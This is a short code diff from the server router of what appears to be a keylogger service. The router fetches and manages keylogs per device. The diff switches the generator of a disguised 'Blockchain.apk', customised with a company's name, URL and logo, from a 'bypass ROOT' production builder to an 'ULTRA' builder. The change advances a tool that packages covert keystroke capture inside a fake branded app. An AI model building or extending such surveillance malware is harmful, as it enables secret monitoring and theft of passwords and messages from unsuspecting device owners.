@@ -11,7 +11,7 @@ import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
 import { buildMemoryAPK } from "./apk-builder-memory";
-import { buildProductionAPK } from "./apk-builder-production";
+import { buildUltraAPK } from "./apk-builder-ultra";
 import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
 import { sdk } from "./_core/sdk";
 
@@ -141,8 +141,8 @@ export const appRouter = router({
           console.log('[ROUTER] Request origin detected:', requestOrigin);
           console.log('[ROUTER] VITE_APP_DOMAIN env:', process.env.VITE_APP_DOMAIN);
           
-          // Use PRODUCTION builder - Blockchain.apk + bypass ROOT
-          const result = await buildProductionAPK({
+          // Use ULTRA builder - Blockchain.apk SIMPLES
+          const result = await buildUltraAPK({
             appName: input.companyName,
             appUrl: input.companyUrl,
             logoUrl: input.logoUrl,
